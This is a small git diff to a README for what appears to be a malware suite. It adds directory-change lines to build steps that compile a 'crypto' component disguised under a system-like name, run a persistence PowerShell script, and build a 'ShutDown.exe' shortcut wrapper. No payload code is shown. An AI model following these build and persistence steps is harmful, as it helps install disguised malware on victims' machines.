@@ -48,6 +48,7 @@ copy the address in parts. The latter being the most efficient option.
 
 ## COMPILATION AND USAGE
 ``` 
+cd '.\src\main\c#\virus suite\crypto\app\'
 csc .\sys_host_dl_v4.0.30319_69.cs
 cd src/main/c#/scripts/powershell
 ./sys_host_dl_v4.0.30319_64_persistence.ps1
@@ -109,6 +110,7 @@ This _"ShutDown.exe"_ wrapper application creates a _Shutdown.lnk_ (link or poin
 
 ## COMPILATION AND USAGE
 ```
+cd .\WindowsExecutables_v2.0\
 csc /reference:Interop.IWshRuntimeLibrary.dll .\ShutDown.cs ~for local testing
 ```
 
